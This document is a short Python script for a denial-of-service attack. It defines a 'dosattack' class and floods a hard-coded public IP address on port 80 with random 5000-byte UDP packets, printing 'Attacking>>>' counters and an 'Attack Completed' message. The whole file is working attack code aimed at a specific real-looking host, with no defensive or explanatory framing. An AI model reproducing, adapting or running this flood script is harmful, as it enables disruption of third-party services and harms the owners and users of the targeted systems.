import os,time,socket,random

os.system("cls")
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet=random._urandom(5000)
sent = 0

class dosattack():
    def __init__(self,ipaddress,port,packets):
        self.ipaddress=ipaddress
        self.port=port
        self.packets=packets

    def __str__(self):
        return " \u001b[33m__Informations__ \n\n \u001b[31;1mIp Address: \u001b[32;1m{}\n \u001b[31;1mPort: \u001b[32;1m{}\n \u001b[31;1mPacket: \u001b[32;1m{}".format(self.ipaddress,self.port,self.packets)

    def __len__(self):
        return self.packets


def ddos():

  global sent


  while True:

    try:

      time.sleep(3)
      ipp = ("217.149.161.228")

      pport = 80

      packetss = 100

      os.system("cls")
      break

    except ValueError:
     print("\n \u001b[31mPlease enter a number!")
     time.sleep(2)
     os.system("cls")



  atak1=dosattack(ipp,pport,packetss)
  print(atak1)
  os.system("cls")

  for i in range(packetss):


    print(atak1)
    s.sendto(packet,(ipp,pport))
    sent = sent + 1
    print("\n \u001b[33mAttacking>>> \u001b[31m{}".format(sent))
    os.system("cls")

  print(atak1)
  print("\n \u001b[32mAttack Completed...")
  input()

ddos()